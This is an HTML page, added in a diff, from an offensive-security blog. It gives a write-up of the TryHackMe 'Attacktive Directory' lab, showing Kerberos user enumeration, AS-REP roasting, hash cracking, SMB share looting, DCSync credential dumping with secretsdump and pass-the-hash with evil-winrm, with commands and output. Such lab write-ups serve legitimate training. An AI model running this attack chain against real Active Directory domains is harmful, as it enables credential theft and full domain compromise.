@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Attacktive Directory - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Attracktive Directory</h1>
+<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-medium">Medium</span> <span class="tag tag-windows">Windows</span> <span class="tag tag-kerberos-user-enum">Kerberos User Enum</span> <span class="tag tag-as-rep-roast">AS-REP Roast</span> <span class="tag tag-hash-cracking">Hash Cracking</span> <span class="tag tag-ntds-creds-extraction">NTDS Creds Extraction</span> <span class="tag tag-pth">PTH</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/attacktivedirectory"><strong>Attacktive Directory</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform. In this ocasion, I&#39;ll enumerate users, find users to do ASREPRoasting to generate a ticket , then enumerate shares as this user and finally perform Kerberoasting and perform PTH over this user.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<pre><code>❯ ping -c 1 10.10.221.181
+PING 10.10.221.181 (10.10.221.181) 56(84) bytes of data.
+64 bytes from 10.10.221.181: icmp_seq=1 ttl=127 time=54.5 ms
+
+--- 10.10.221.181 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 54.500/54.500/54.500/0.000 ms
+</code></pre>
+<p>In this case, the target seems to be a Windows machine. Let&#39;s perform some scans.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.221.181 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:32 CET
+Initiating SYN Stealth Scan at 21:32
+Scanning 10.10.221.181 [65535 ports]
+Discovered open port 3389/tcp on 10.10.221.181
+Discovered open port 445/tcp on 10.10.221.181
+Discovered open port 135/tcp on 10.10.221.181
+Discovered open port 139/tcp on 10.10.221.181
+Discovered open port 80/tcp on 10.10.221.181
+Discovered open port 53/tcp on 10.10.221.181
+Discovered open port 49669/tcp on 10.10.221.181
+Discovered open port 49669/tcp on 10.10.221.181
+Discovered open port 49683/tcp on 10.10.221.181
+Discovered open port 389/tcp on 10.10.221.181
+Discovered open port 49675/tcp on 10.10.221.181
+Discovered open port 49676/tcp on 10.10.221.181
+Discovered open port 49664/tcp on 10.10.221.181
+Discovered open port 49664/tcp on 10.10.221.181
+Discovered open port 593/tcp on 10.10.221.181
+Discovered open port 5985/tcp on 10.10.221.181
+Discovered open port 464/tcp on 10.10.221.181
+Discovered open port 49665/tcp on 10.10.221.181
+Discovered open port 49679/tcp on 10.10.221.181
+Discovered open port 49667/tcp on 10.10.221.181
+Discovered open port 49667/tcp on 10.10.221.181
+Discovered open port 3269/tcp on 10.10.221.181
+Discovered open port 3268/tcp on 10.10.221.181
+Discovered open port 3268/tcp on 10.10.221.181
+Discovered open port 49672/tcp on 10.10.221.181
+Discovered open port 3268/tcp on 10.10.221.181
+Discovered open port 47001/tcp on 10.10.221.181
+Discovered open port 9389/tcp on 10.10.221.181
+Discovered open port 49712/tcp on 10.10.221.181
+Discovered open port 49712/tcp on 10.10.221.181
+Discovered open port 49712/tcp on 10.10.221.181
+Increasing send delay for 10.10.221.181 from 0 to 5 due to max_successful_tryno increase to 4
+Discovered open port 636/tcp on 10.10.221.181
+Discovered open port 49696/tcp on 10.10.221.181
+Discovered open port 88/tcp on 10.10.221.181
+Discovered open port 88/tcp on 10.10.221.181
+Completed SYN Stealth Scan at 21:33, 55.60s elapsed (65535 total ports)
+Nmap scan report for 10.10.221.181
+Host is up, received user-set (0.065s latency).
+Scanned at 2025-11-06 21:32:24 CET for 56s
+Not shown: 51052 closed tcp ports (reset), 14456 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+49672/tcp open  unknown          syn-ack ttl 127
+49675/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49679/tcp open  unknown          syn-ack ttl 127
+49683/tcp open  unknown          syn-ack ttl 127
+49696/tcp open  unknown          syn-ack ttl 127
+49712/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 55.71 seconds
+           Raw packets sent: 275840 (12.137MB) | Rcvd: 60645 (2.426MB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49683,49696,49712 10.10.221.181 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:34 CET
+Nmap scan report for 10.10.221.181
+Host is up (0.080s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-06 20:34:38Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-11-06T20:35:43+00:00; -2s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-11-06T20:35:33+00:00
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2025-11-05T20:26:46
+|_Not valid after:  2026-05-07T20:26:46
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49683/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-11-06T20:35:35
+|_  start_date: N/A
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.43 seconds
+</code></pre>
+<p>We have the first 3 flags of the machine in the Nmap output. Nmap found some open ports and we can extract a lot of information from this big output:</p>
+<ul>
+<li>Open ports like 53, 88, 139, 445... are a good indication that we are facing a <strong>Windows Domain Controller</strong>.</li>
+<li>The FQDN of the targeted machine is <code>AttacktiveDirectory.spookysec.local</code> and the target domain is <code>spookysec.local</code></li>
+</ul>
+<p>I&#39;ll add this in my <code>/etc/hosts</code> file:</p>
+<pre><code>10.10.221.181 AttacktiveDirectory.spookysec.local spookysec.local
+</code></pre>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p>Now, we can perform <strong>bruteforce</strong> over Kerberos (port 88) with the tool <a href="https://github.com/ropnop/kerbrute/releases"><strong>Kerbrute</strong></a> to enumerate users, passwords and even password spray. I&#39;ll use the wordlist that you can find in the description of this machine.</p>
+<pre><code>❯ ./kerbrute_linux_amd64 userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 11/06/25 - Ronnie Flathers @ropnop
+
+2025/11/06 21:54:44 &gt;  Using KDC(s):
+2025/11/06 21:54:44 &gt;  	AttacktiveDirectory.spookysec.local:88
+
+2025/11/06 21:54:45 &gt;  [+] VALID USERNAME:	james@spookysec.local
+2025/11/06 21:54:46 &gt;  [+] VALID USERNAME:	svc-admin@spookysec.local
+2025/11/06 21:54:48 &gt;  [+] VALID USERNAME:	robin@spookysec.local
+2025/11/06 21:54:55 &gt;  [+] VALID USERNAME:	darkstar@spookysec.local
+2025/11/06 21:54:59 &gt;  [+] VALID USERNAME:	administrator@spookysec.local
+2025/11/06 21:55:08 &gt;  [+] VALID USERNAME:	backup@spookysec.local
+2025/11/06 21:55:12 &gt;  [+] VALID USERNAME:	paradox@spookysec.local
+2025/11/06 22:01:36 &gt;  [+] VALID USERNAME:	ori@spookysec.local
+...
+</code></pre>
+<p>The notable accounts of this list are <code>svc-admin</code> and <code>backup</code>.</p>
+<blockquote>
+<p><strong>ASREPRoasting</strong> occurs when a user account has the privilege &quot;Does not require Pre-Authentication&quot; set. This means that the account <strong>does not</strong> need to provide valid identification before requesting a Kerberos Ticket for the specified user account.</p>
+</blockquote>
+<hr>
+<h2>Exploitation</h2>
+<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> has a tool called GetNPUsers.pythat will allow us to query ASReproastable accounts from the Key Distribution Center using the list of users we got before.</p>
+<pre><code>❯ GetNPUsers.py spookysec.local/svc-admin -no-pass
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0afe***REDACTED_HASH***
+
+❯ GetNPUsers.py spookysec.local/backup -no-pass
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for backup
+[-] User backup doesn`t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+<p>We have got a TGT for svc-admin. We can try to identify the provided hash in this page: <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>  </p>
+<p>The hash is a <code>Kerberos 5 AS-REP etype 23</code>, mode 18200. Now, I&#39;ll try to crack the hash with the password&#39;s wordlist provided.</p>
+<pre><code>❯ john -w:../scripts/passwordlist.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 7 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+***REDACTED_PASSWORD***   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
+1g 0:00:00:00 DONE (2025-11-06 22:22) 2.500g/s 17920p/s 17920c/s 17920C/s ghetto1..frida
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>We have valid credentials in the domain, so now we can attempt to enumerate shared resources of the DC. I&#39;ll use <code>smbclient</code>.</p>
+<pre><code>❯ smbclient -L //10.10.221.181 -U svc-admin
+Password for [WORKGROUP\svc-admin]:
+
+	Sharename       Type      Comment
+	 ---       ----       -
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.221.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+❯ smbclient //10.10.221.181/backup -U svc-admin
+Password for [WORKGROUP\svc-admin]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Apr  4 21:08:39 2020
+  ..                                  D        0  Sat Apr  4 21:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020
+
+		8247551 blocks of size 4096. 3592887 blocks available
+smb: \&gt; 
+</code></pre>
+<p>We have base64 encoded backup credentials. Let&#39;s decode the credentials of the backup user.</p>
+<pre><code>❯ echo &quot;***REDACTED***&quot; | base64 -d; echo
+***REDACTED***
+</code></pre>
+<hr>
+<h2>Post-Exploitation</h2>
+<p>The backup user is the backup account for the Domain Controller. This account has a permission that allows all AD changes to be synced with this user account and this includes password hashes.</p>
+<p>I&#39;ll use a Impacket tool called <code>secretsdump.py</code>. This will dump all password hashes that this user has.</p>
+<pre><code>❯ secretsdump.py -just-dc backup@spookysec.local
+...
+Administrator:500:***REDACTED***:::
+...
+</code></pre>
+<p>Now, let&#39;s perform PTH.</p>
+<pre><code>❯ evil-winrm -i 10.10.221.181 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+Evil-WinRM shell v3.7
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; 
+</code></pre>
+<p>And in the Desktop folder of each user you&#39;ll find the flags. That&#39;s all for this ocasion!</p>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
